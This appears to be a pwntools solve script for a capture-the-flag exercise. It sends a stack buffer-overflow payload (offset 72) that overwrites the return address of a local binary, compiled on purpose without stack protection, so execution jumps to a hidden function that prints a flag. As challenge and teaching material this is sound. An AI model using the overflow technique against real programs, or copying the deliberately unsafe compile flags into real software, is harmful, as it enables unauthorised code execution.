from pwn import *

binary_path = './vuln_binary'
context.binary = elf = ELF(binary_path)
context.log_level = 'info'
password = "INSERT YOUR PASSWORD HERE"

# NOTE: Solve script needs a local copy of the binary to work, and a /flag.txt. 
# The binary must also have root permissions to read the flag file.
# Compiled with `gcc -o vuln_binary vuln_binary.c -fno-stack-protector -z execstack -no-pie && strip --strip-all vuln_binary`
target = 0x40126e 

offset = 72

def solve():
    io = process(binary_path)

    io.sendline(b'slang')
    io.sendline(password.encode())

    # ret_gadget = 0x40127f 
    
    payload = flat({
        offset: [
            # ret_gadget,  
            target
        ]
    })

    log.info(f"Sending payload to jump to {hex(target)}...")
    
    io.sendline(payload)

    io.recvuntil(b'Debug session completed.\n', timeout=1)
    
    result = io.recvall(timeout=2).decode(errors='ignore')
    
    print("\n" + "="*40)
    print("FLAG OUTPUT:")
    print(result.strip())
    print("="*40 + "\n")
        
if __name__ == "__main__":
    solve()